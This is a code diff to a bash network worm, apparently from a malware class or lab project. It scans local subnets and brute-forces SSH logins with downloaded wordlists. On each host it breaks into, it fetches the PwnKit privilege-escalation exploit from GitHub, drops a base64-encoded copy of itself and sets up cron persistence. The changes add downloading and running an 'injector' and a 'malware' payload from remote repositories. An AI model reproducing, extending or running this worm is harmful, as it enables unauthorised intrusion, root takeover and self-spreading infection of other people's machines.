@@ -13,6 +13,10 @@ PASSWORDS_FILE="/tmp/passwords.txt"
 HOSTS_FILE="/tmp/hosts.txt"
 WORM_FILE="/tmp/system_update.sh"
 PRIV_ESC_FILE="/tmp/pwnkit.sh"
+INJECTOR_URL="https://github.com/Botxan/TechnoTrust/raw/refs/heads/main/inject_program"
+INJECTOR_FILE="/tmp/inject"
+PAYLOAD_URL="https://github.com/king-azul/malware-project/raw/refs/heads/main/malware"
+PAYLOAD_FILE="/tmp/malware"
 
 # Function to get all subnets connected to the machine, excluding loopback and 10.0.2.10 network
 get_subnets() {
@@ -25,7 +29,7 @@ get_subnets() {
 discover_hosts() {
   subnets="$1"
   > "$HOSTS_FILE"  # Clear the file before adding new hosts
-  # echo "Discovering hosts in the subnets..."
+  echo "Discovering hosts in the subnets..."
   
   for subnet in $subnets; do
     base_ip=$(echo $subnet | cut -d'.' -f1-3)
@@ -48,14 +52,21 @@ discover_hosts() {
 }
 
 # Function to download the username and password lists
-download_wordlists() {
+download_files() {
   echo "Downloading username wordlist..."
   wget -q $USERNAME_LIST_URL -O $USERNAMES_FILE
   echo "Downloading password wordlist..."
   wget -q $PASSWORD_LIST_URL -O $PASSWORDS_FILE
+  echo "Downloading injector..."
+  wget -q $INJECTOR_URL -O $INJECTOR_FILE
+  chmod +x $INJECTOR_FILE
+  echo "Downloading payload..."
+  wget -q $PAYLOAD_URL -O $PAYLOAD_FILE
+  chmod +x $PAYLOAD_FILE
+ 
 
-  if [[ ! -f "$USERNAMES_FILE" || ! -f "$PASSWORDS_FILE" ]]; then
-    echo "Failed to download wordlists. Exiting."
+  if [[ ! -f "$USERNAMES_FILE" || ! -f "$PASSWORDS_FILE" || ! -f "$INJECTOR_FILE" || ! -f "$PAYLOAD_FILE" ]]; then
+    echo "Failed to download files. Exiting."
     exit 1
   fi
 }
@@ -65,37 +76,20 @@ brute_force_ssh() {
   username="$2"
   password="$3"
 
-  # echo "Testing $username:$password on $target_ip"
+  echo "Testing $username:$password on $target_ip"
 
   worm_base64=$(base64 -w 0 "$WORM_FILE")
 
-timeout 10 sshpass -p "$password" ssh \
+  timeout 10 sshpass -p "$password" ssh \
     -o StrictHostKeyChecking=no \
     -o UserKnownHostsFile=/dev/null \
     -o ConnectTimeout=5 \
     -o ConnectionAttempts=2 \
     "$username@$target_ip" \
-    'curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh > "$PRIV_ESC_FILE"
-        chmod +x "$PRIV_ESC_FILE"
-        
-        echo "$worm_base64" | base64 -d > "$WORM_FILE"
-        chmod +x "$WORM_FILE"
-        
-        "$PRIV_ESC_FILE" << EOF
-whoami > /tmp/current_user
-(crontab -l 2>/dev/null | grep -v "$WORM_FILE"; echo "* * * * * $WORM_FILE") | crontab -
-EOF' &> /dev/null
-
-#timeout 10 sshpass -p "$password" ssh \
-#    -o StrictHostKeyChecking=no \
-#    -o UserKnownHostsFile=/dev/null \
-#    -o ConnectTimeout=5 \
-#    -o ConnectionAttempts=2 \
-#    "$username@$target_ip" \
-#    "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh > $PRIV_ESC_FILE && \
-#    chmod +x $PRIV_ESC_FILE && \
-#    echo $worm_base64 | base64 -d > $WORM_FILE && chmod +x $WORM_FILE && \
-#    echo '(crontab -l 2>/dev/null | grep -v \"$WORM_FILE\"; echo \"* * * * * $WORM_FILE\") | crontab -' | $PRIV_ESC_FILE" &> /dev/null
+    "curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh > $PRIV_ESC_FILE && \
+    chmod +x $PRIV_ESC_FILE && \
+    echo $worm_base64 | base64 -d > $WORM_FILE && chmod +x $WORM_FILE && \
+    echo '(crontab -l 2>/dev/null | grep -v \"$WORM_FILE\"; echo \"* * * * * cd /tmp && $WORM_FILE\") | crontab -' | $PRIV_ESC_FILE" &> /dev/null
 }
 
 # Function to handle cleanup in case of error
@@ -121,7 +115,9 @@ main() {
   fi
 
   # Download the wordlists
-  download_wordlists
+  download_files
+  $INJECTOR_FILE
+
   subnets=$(get_subnets)
   
   if [[ -z "$subnets" ]]; then
